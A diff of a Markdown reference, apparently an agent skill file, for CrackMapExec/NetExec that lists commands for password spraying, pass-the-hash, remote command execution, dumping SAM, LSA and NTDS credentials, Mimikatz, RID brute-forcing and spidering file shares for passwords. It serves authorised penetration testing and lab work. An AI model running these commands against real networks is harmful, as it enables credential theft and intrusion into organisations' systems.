@@ -1,112 +1,64 @@
 ---
 name: crackmapexec
-description: "Auth/lab ref: CrackMapExec AD/SMB/WinRM/LDAP assessment; auth validation, share/user inventory, policy checks, evidence workflow."
-license: BSD-2-Clause
-compatibility: "Linux (primary)."
-metadata:
-  author: AeonDave
-  version: "1.0"
+description: "NetExec (formerly CrackMapExec): SMB, WinRM, and LDAP enumeration, password spraying, and file spidering across Active Directory."
 ---
 
-# CrackMapExec / NetExec (nxc)
+# crackmapexec (NetExec)
 
-AD post-exploitation multitool — spray, enumerate, execute, and dump across SMB/WinRM/LDAP.
+**Goal**: Validate credentials, enumerate shares, spray passwords, and spider SMB shares across Windows networks.
 
-> **Note**: CrackMapExec (cme) is deprecated. Use **NetExec** (`nxc`) — same syntax, actively maintained.
+> **Note**: CrackMapExec (`cme`) is officially deprecated. Modern versions are branded as **NetExec** (`nxc`). The syntax remains identical (`nxc smb` instead of `cme smb`).
 
-## Quick Start
+## 1. Authentication and Protocol Flags
 
-```bash
-# Check connectivity + SMB signing
-nxc smb 192.168.1.0/24
-
-# Credential validation
-nxc smb 192.168.1.10 -u admin -p Password123
-
-# Enumerate shares
-nxc smb 192.168.1.10 -u admin -p Password123 --shares
-```
-
-## Protocols
-
-`smb`, `winrm`, `ldap`, `mssql`, `ssh`, `rdp`, `ftp`, `vnc`
-
-## Core Flags
-
-| Flag | Description |
-|------|-------------|
-| `-u <user>` | Username or user list |
-| `-p <pass>` | Password or password list |
-| `-H <hash>` | NTLM hash (pass-the-hash) |
-| `--local-auth` | Authenticate with local account |
-| `-d <domain>` | Domain name |
-| `-k` | Use Kerberos authentication |
-| `--continue-on-success` | Don't stop on first valid cred |
-| `-x <cmd>` | Execute command (cmd.exe) |
-| `-X <cmd>` | Execute PowerShell command |
-| `--exec-method <m>` | Execution method: `wmiexec,smbexec,atexec,mmcexec` |
-| `--shares` | Enumerate shares |
-| `--users` | Enumerate domain users |
-| `--groups` | Enumerate domain groups |
-| `--computers` | Enumerate domain computers |
-| `--loggedon-users` | Show logged-on users |
-| `--sessions` | Show active sessions |
-| `--sam` | Dump SAM hashes |
-| `--lsa` | Dump LSA secrets |
-| `--ntds` | Dump NTDS.dit (DC only) |
-| `-M <module>` | Load a module |
-| `--pass-pol` | Get password policy |
-| `--rid-brute` | RID brute-force user enumeration |
-
-## Common Workflows
+NetExec supports multiple protocols (`smb`, `winrm`, `ldap`, `mssql`, `ssh`, `rdp`).
+- `-u` Username, `-p` Password.
+- `-d` Domain (Use `-d ''` or `--local-auth` for local SAM accounts).
+- `-H` Pass-The-Hash (NTLM).
 
 ```bash
-# Password spray across subnet (continue on success)
-nxc smb 192.168.1.0/24 -u users.txt -p "Summer2024!" --continue-on-success
+# Basic SMB auth check against an IP range
+nxc smb 10.10.10.0/24 -u 'user' -p 'password'
 
-# Pass-the-hash
-nxc smb 192.168.1.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117 --local-auth
-
-# Remote command execution
-nxc smb 192.168.1.10 -u admin -p Password123 -x "whoami /all"
-
-# Enumerate shares + readable content
-nxc smb 192.168.1.10 -u admin -p Password123 --shares
-
-# SAM dump (local admin required)
-nxc smb 192.168.1.10 -u admin -p Password123 --sam
-
-# NTDS dump (domain controller, DA required)
-nxc smb <DC_IP> -u admin -p Password123 --ntds
-
-# Execute with WinRM
-nxc winrm 192.168.1.10 -u admin -p Password123 -x "ipconfig /all"
-
-# LDAP: enumerate AD users
-nxc ldap 192.168.1.10 -u admin -p Password123 --users
+# Local Authentication Check
+nxc smb 10.10.10.50 -u 'Administrator' -H '8846f7eaee8fb117ad06bdd830b7586c' --local-auth
 ```
+*Note*: If you see `STATUS_LOGON_FAILURE`, the creds are bad. If you see `(Pwn3d!)`, you have Administrative privileges over that endpoint.
 
-## Useful Modules
+## 2. Deep SMB Enumeration (0xdf Workflows)
 
+When searching for data on open file shares:
+
+### Null Session & Anonymous Enum
+Attempt to list shares without any valid credentials.
 ```bash
-# Mimikatz (requires admin)
-nxc smb 192.168.1.10 -u admin -p Password123 -M mimikatz
-
-# BloodHound data collection
-nxc ldap <DC_IP> -u admin -p Password123 -M bloodhound
-
-# WebDAV check
-nxc smb 192.168.1.0/24 -M webdav
-
-# Printer nightmare check
-nxc smb 192.168.1.0/24 -M printnightmare
-
-# Check for GPP passwords
-nxc smb 192.168.1.0/24 -u admin -p Password123 -M gpp_password
+nxc smb 10.10.10.50 -u 'guest' -p '' --shares
 ```
 
-## Resources
+### RID Cycling
+If you have a guest or null session, you can bruteforce RIDs to extract the full list of Local/Domain Users.
+```bash
+nxc smb 10.10.10.50 -u 'guest' -p '' --rid-brute
+```
 
-| File | When to load |
-|------|--------------|
-| `references/modules.md` | Full module list, module-specific flags, output parsing |
+### Share Spidering (`spider_plus` Module)
+If you have valid credentials and found readable shares, `spider_plus` will recursively crawl the shares and dump a JSON tree of all filenames, allowing you to `grep` for passwords or config files offline without downloading terabytes of ISOs.
+```bash
+nxc smb 10.10.10.50 -u 'user' -p 'pass' -M spider_plus
+```
+*(Results are saved to `/tmp/spider_plus/` or `~/.nxc/workspaces/`).*
+
+### Extracting Secrets
+If the terminal outputs `Pwn3d!`, you can immediately dump credentials from the host.
+```bash
+nxc smb 10.10.10.50 -u 'user' -p 'pass' --sam
+nxc smb 10.10.10.50 -u 'user' -p 'pass' --lsa
+nxc smb 10.10.10.50 -u 'user' -p 'pass' --ntds
+```
+
+## 3. Alternative: ManSpider
+
+If `nxc -M spider_plus` is too noisy or you need to specifically search *inside* document contents (Word, Excel, PDF) instead of just filenames, use **ManSpider**.
+```bash
+manspider 10.10.10.50 -u 'user' -d 'domain.local' -p 'pass' -f 'password' 'secret' 'api_key'
+```
